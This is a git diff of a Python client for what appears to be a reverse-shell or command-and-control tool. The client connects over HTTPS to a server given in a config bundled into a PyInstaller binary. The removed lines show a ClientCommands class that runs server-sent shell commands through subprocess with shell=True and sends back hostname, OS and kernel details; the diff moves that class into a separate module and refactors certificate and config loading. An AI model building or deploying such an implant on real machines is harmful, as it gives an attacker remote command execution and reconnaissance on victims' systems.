@@ -6,60 +6,13 @@ __author__ = "EONRaider @ keybase.io/eonraider"
 import configparser
 import getpass
 import http.client
-import json
-import os
 import platform
 import ssl
-import subprocess
 import sys
 from pathlib import Path
-from time import localtime, strftime
 from urllib import request, parse
 
-
-class ClientCommands:
-    def __init__(self, client):
-        """Dispatch commands received from the server to their respective
-        methods, depending on their format.
-
-        :param client: Instance of Client through which commands will be
-            received.
-        """
-        self.client = client
-
-    def _send(self, message: [str, bytes, dict], mode: str = "output") -> None:
-        """Wrapper for the client's 'post' method."""
-        self.client.post({mode: message})
-
-    def open_session(self) -> None:
-        session_info = {
-            "Client time": strftime("%Y-%m-%d %H:%M:%S", localtime()),
-            "OS": platform.system(),
-            "Hostname": platform.node(),
-            "Kernel": f"{platform.release()} {platform.version()} ",
-            "Platform": f"{platform.machine()}"
-        }
-        self._send(json.dumps(session_info), mode="open_session")
-
-    def cd(self, dest_dir: [str, list]) -> None:
-        """Handles change of working directory in the shell."""
-        try:
-            dest_dir = "~" if len(dest_dir) == 0 else "".join(dest_dir)
-            os.chdir(Path(dest_dir).expanduser())
-        except FileNotFoundError as e:
-            self._send(f"{e}\n")
-
-    def shell(self, command: str) -> None:
-        """Handles all standard shell commands received from the
-        server."""
-        try:
-            cmd = subprocess.run(command, capture_output=True, shell=True)
-        except FileNotFoundError as e:
-            self._send(f"{e}\n")
-        else:
-            for result in cmd.stdout, cmd.stderr:
-                if len(result) > 0:
-                    self._send(result)
+from commands import ClientCommands
 
 
 class Client:
@@ -78,23 +31,11 @@ class Client:
         self.server_address = server_address
         self.server_port = server_port
         self._commands = ClientCommands(self)
-        self.ca_cert = ca_cert
+        self.ca_cert = Path(ca_cert)
         self._ssl_context = ssl.create_default_context(
             purpose=ssl.Purpose.SERVER_AUTH,
-            cafile=str(self._base_path.joinpath("ca.pem"))
+            cafile=str(self.ca_cert)
         )
-
-    @property
-    def _base_path(self) -> Path:
-        """
-        Gets the absolute path for the directory of the current file.
-        """
-        try:
-            '''If the file is compiled as a binary by PyInstaller, its 
-            path will be set by sys._MEIPASS'''
-            return Path(sys._MEIPASS)
-        except AttributeError:
-            return Path(__file__).parent.absolute()
 
     @property
     def server_url(self) -> str:
@@ -163,7 +104,28 @@ if __name__ == "__main__":
 
     _args = parser.parse_args()
 
-    if all((_args.host, _args.port)):
+    try:
+        '''Client is executed as a binary compiled by PyInstaller. All 
+        configuration options are read from the client.cfg file that is 
+        bundled in the binary during the build process defined in the 
+        build.py file. In this case the location of all added data will 
+        be a temporary directory set by sys._MEIPASS. If such directory 
+        does not exist an AttributeError is raised.'''
+        tmp_dir = Path(sys._MEIPASS)
+        config = configparser.ConfigParser()
+        config_file = config.read(tmp_dir.joinpath("client.cfg"))
+        if len(config_file) == 0:
+            raise SystemExit("Cannot initialize client without specification "
+                             "of a host and port to connect to.")
+        client_cfg = config["CLIENT"]
+        _ca_cert = tmp_dir.joinpath(client_cfg.get("ca-certificate")) \
+            if _args.ca_cert is None else _args.ca_cert
+        Client(
+            server_address=client_cfg.get("host"),
+            server_port=client_cfg.getint("port"),
+            ca_cert=_ca_cert
+        ).execute()
+    except AttributeError:
         '''Client is executed from source code by the system interpreter 
         for development purposes. All configuration options are parsed 
         from the CLI.'''
@@ -171,20 +133,4 @@ if __name__ == "__main__":
             server_address=_args.host,
             server_port=_args.port,
             ca_cert=_args.ca_cert
-        ).execute()
-    else:
-        '''Client is executed as a binary compiled by PyInstaller. All 
-        configuration options are read from the client.cfg file that is 
-        bundled in the binary during the build process defined in the 
-        build.py file.'''
-        config = configparser.ConfigParser()
-        file = config.read(Path(sys._MEIPASS).joinpath("client.cfg"))
-        if len(file) == 0:
-            raise SystemExit("Cannot initialize client without specification "
-                             "of a host and port to connect to.")
-        client_cfg = config["CLIENT"]
-        Client(
-            server_address=client_cfg.get("host"),
-            server_port=client_cfg.getint("port"),
-            ca_cert=client_cfg.get("ca-certificate")
         ).execute()
